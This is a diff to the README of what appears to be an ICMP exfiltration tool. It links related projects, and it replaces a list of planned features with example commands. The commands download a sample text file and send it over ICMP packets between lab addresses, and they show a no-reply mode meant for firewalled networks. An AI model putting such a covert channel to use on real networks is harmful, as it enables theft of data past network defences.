@@ -11,14 +11,11 @@ https://github.com/cyb3rw01f/icmpExfiltrater (avec command on serverside)
 https://github.com/martinoj2009/ICMPExfil
 
 ## options
-- client :size of packet
-- client: delay
-- server: truncated (accept truncated data, with delay in parameter, wait for delay*NB packets seconds(plus a few) and close all after)
-- client: filename or simple message
-- server: save in file or print out
+$ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt && ./qssender send file -d 2 -l 127.0.0.1 -r 10.0.2.15 bible.txt -s 50000
+$ ./qsreceiver receive -l 10.0.2.15 -p -f received_bible.txt
 
-- server: integrity check
-- server: crossbar advancement
-- client: noreply (does not waiting for reply, in case they are filtered by fw)
 
-<p hidden>add encryption</p>
+$./qssender send "thisisatest i want to send a string w/o waiting for the echo reply " -d 1 -l 127.0.0.1 -r 10.0.2.15 go.mod -s 1 -N
+$./qsreceiver receive truncated 1 -l 10.0.2.15
+
+<p hidden>add encryption + integrity check</p>
